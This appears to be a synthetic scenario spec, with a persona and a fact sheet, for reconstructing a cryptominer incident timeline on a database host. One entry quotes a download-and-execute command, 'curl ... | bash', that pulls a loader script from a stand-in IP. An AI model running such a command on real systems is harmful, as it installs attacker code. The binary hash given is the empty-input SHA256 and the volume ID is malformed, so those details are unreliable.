description: A response lead is building a precise incident timeline from logs, ticket comments, chat messages, and human recollections to understand what happened first and which decisions followed from it.

user_profile.persona: 38-year-old incident responder responsible for reconstructing events under pressure
user_profile.context: The tools captured a lot of detail, but not in one chronological narrative that people can rely on
user_profile.communication_style: Chronological and exacting, distrusts vague summaries

fact_sheet.fact: On 2024-08-15 at 02:17:45 UTC, Datadog alert #78119 triggered for 'CPU Utilization > 95% for 10m' on host 'zeus-db-prod-01'.
Priya Sharma (psharma), the on-call SRE, was paged via PagerDuty for alert #78119 at 02:18:02 UTC.
Jira ticket INC-2024-8814 was automatically created by the PagerDuty integration at 02:18:15 UTC and assigned to Priya Sharma.
At 02:24:10 UTC, Priya Sharma identified a process named 'kworker_xmr' with PID 8812 consuming 98% CPU on 'zeus-db-prod-01' using the 'top' command.
At 02:28:00 UTC, Priya Sharma created the public Slack channel '#inc-zeus-db-cpu' and invited the SRE and Security distribution lists.
At 02:35:50 UTC, Priya Sharma ran the Splunk query 'index=os host="zeus-db-prod-01" process_name="kworker_xmr"' which returned 0 results, indicating the process name was likely spoofed.
The process with PID 8812 was determined to be running under the service account 'svc_deploy' at 02:41:00 UTC.
A search of auth logs for user 'svc_deploy' revealed an anomalous SSH login at 01:55:13 UTC from IP address 10.80.5.22, the IP of host 'apollo-web-prod-03'.
At 02:45:00 UTC, Priya Sharma escalated the incident to the on-call security analyst, Ben Carter (bcarter).
Ben Carter joined the Slack channel '#inc-zeus-db-cpu' at 02:47:19 UTC and requested a memory dump of the affected host.
At 03:05:21 UTC, Ben Carter found a log entry in `/var/log/bash_history` on 'zeus-db-prod-01' showing the command 'curl -s 198.51.100.55/loader.sh | bash' executed by 'svc_deploy'.
At 03:15:00 UTC, a decision was made by Priya Sharma and Ben Carter to isolate host 'zeus-db-prod-01' from the production network.
An AWS security group rule change was applied at 03:18:45 UTC, restricting all ingress and egress traffic for 'zeus-db-prod-01' (IP: 10.45.12.101) except for SSH from the bastion host (IP: 10.1.1.5).
Incident Response Lead Maria Flores (mflores) was briefed and officially assumed the role of Incident Commander at 03:30:00 UTC.
A forensics image of the 'zeus-db-prod-01' EBS volume (vol-0a1b2c3d4e5f6g7h) was initiated at 03:40:15 UTC.
The SHA256 hash of the downloaded binary '/tmp/.x' was calculated as e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.
At 03:55:00 UTC, the binary hash was submitted to VirusTotal and matched the signature 'Trojan.Linux.XMRig.v4'.
At 04:10:00 UTC, the password for the 'svc_deploy' account was rotated and all active sessions were terminated.
Netflow logs showed 'zeus-db-prod-01' communicating with command and control (C2) server IP 203.0.113.88 on port 4444 between 02:05:00 and 03:18:45 UTC.
The C2 IP address 203.0.113.88 was blocked at the perimeter firewall for all outbound traffic at 04:25:00 UTC.
At 04:45:00 UTC, the team decided to rebuild 'zeus-db-prod-01' from a known-good AMI (ami-098765fedcba4321) and restore data from a database backup taken at 2024-08-15 01:00:00 UTC.
The compromised web server 'apollo-web-prod-03' was found to be running an unpatched version of Apache Struts (2.5.20).
The new database instance, 'zeus-db-prod-01b', was deployed and passed all health checks at 06:30:00 UTC.
Production traffic was fully routed to 'zeus-db-prod-01b' at 06:45:10 UTC, and the compromised instance 'zeus-db-prod-01' was terminated.
At 07:00:00 UTC, Maria Flores updated the status of Jira ticket INC-2024-8814 to 'Resolved'.
A post-mortem meeting for INC-2024-8814 was scheduled via Google Calendar for 2024-08-17 at 14:00:00 UTC.

The investigation concluded that the anomalous SSH login from host 'apollo-web-prod-03' to 'zeus-db-prod-01' using the service account 'svc_deploy' at 01:55:13 UTC was the initial access event that preceded the malicious downloader execution and later C2 traffic.

Additional containment actions taken during the incident included isolating 'zeus-db-prod-01' from the production network at 03:18:45 UTC and blocking outbound traffic to the C2 IP address 203.0.113.88 at the perimeter firewall at 04:25:00 UTC.

The full set of containment actions taken for the compromised service account 'svc_deploy' and the affected host 'zeus-db-prod-01' was: isolate 'zeus-db-prod-01' from the production network via AWS security group restrictions, rotate the password for 'svc_deploy', terminate all active 'svc_deploy' sessions, and block outbound traffic to the C2 IP address 203.0.113.88 at the perimeter firewall; no other containment actions for that host or service account were recorded in the incident timeline.
